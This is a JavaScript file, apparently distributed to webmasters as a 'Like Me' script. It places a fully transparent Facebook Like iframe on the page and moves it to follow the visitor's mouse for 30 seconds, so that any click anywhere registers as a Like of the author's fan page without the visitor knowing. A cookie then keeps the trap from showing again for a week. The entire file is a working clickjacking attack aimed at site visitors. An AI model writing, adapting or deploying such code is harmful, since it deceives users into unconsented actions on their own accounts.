/*****************************************************
Script name: Like Me
Author: Nguyen Duy Nhan
Email: contact@vnwebmaster.com
Website: www.vnwebmaster.com - www.nhanweb.com
******************************************************/
var fan_page_url = 'https://www.facebook.com/webmastersvietnam'; //Like this FanPage to use my script. Thank !
var opacity = 0.0;
var time = 30000; //1000 = 1s

if((document.getElementById) && window.addEventListener || window.attachEvent){
	(function(){
		if(is_show()){
			var hairCol = "#ff0000";
			var d = document;
			var my = -10;
			var mx = -10;
			var r;
			var vert = "";
			var thehairs = "<iframe id='theiframe' scrolling='no' frameBorder='0' allowTransparency='true' src='http://www.facebook.com/plugins/like.php?href=" + encodeURIComponent(fan_page_url) + "&amp;layout=standard&amp;show_faces=false&amp;width=150&amp;action=like&amp;colorscheme=light&amp;height=30' style='position:absolute;width:18px;height:20px;overflow:hidden;border:0;opacity:" + opacity +";filter:alpha(opacity=" + opacity * 100+ ");'></iframe>";
			document.write(thehairs);
			
			var like = document.getElementById("theiframe");
			document.getElementsByTagName('body')[0].appendChild(like);
	
			var pix = "px";
			var domWw = (typeof window.innerWidth == "number");
			var domSy = (typeof window.pageYOffset == "number");
	
			if (domWw)
				r = window;
			else{ 
				if (d.documentElement && typeof d.documentElement.clientWidth == "number" && d.documentElement.clientWidth != 0)
					r = d.documentElement;
				else{
					if (d.body && typeof d.body.clientWidth == "number")
						r = d.body;
				}
			}
			if(time != 0){
				setTimeout(function(){
					document.getElementsByTagName('body')[0].removeChild(like);
					set_likedme();
					if (window.addEventListener){
						document.removeEventListener("mousemove",mouse,false);
					}  
					else if (window.attachEvent){
						document.detachEvent("onmousemove",mouse);
					}
				}, time);
			}
			if (window.addEventListener){
				window.addEventListener("load",init,false);
				document.addEventListener("mousemove",mouse,false);
			}  
			else if (window.attachEvent){
				window.attachEvent("onload",init);
				document.attachEvent("onmousemove",mouse);
			}
		
		}
		
		function is_show(){
			
			likeme_cookie = $.cookie("likeme_cookie");
			if(likeme_cookie=='undefined' || likeme_cookie!= 'true'){
				return true;
			}
			return false;
		}
		function set_likedme(){
			$.cookie("likeme_cookie", true, { expires: 7 });
		}
		function scrl(yx){
			var y,x;
			if (domSy){
				y = r.pageYOffset;
				x = r.pageXOffset;
			}
			else{
				y = r.scrollTop;
				x = r.scrollLeft;
			}
			return (yx == 0) ? y:x;
		}

		function mouse(e){
			var msy = (domSy)?window.pageYOffset:0;
			if (!e)
				e = window.event;    
			if (typeof e.pageY == 'number'){
				my = e.pageY - msy;
				mx = e.pageX;
			}
			else{
				my = e.clientY - msy;
				mx = e.clientX ;
			}
			vert.top = my + scrl(0) + pix;
			vert.left = mx + pix;
		}

		function ani(){
			vert.top = my + scrl(0) + pix;
			setTimeout(ani, 300);
		}


		function init(){
			vert = document.getElementById("theiframe").style;
			ani();
		}
	})();
}//End.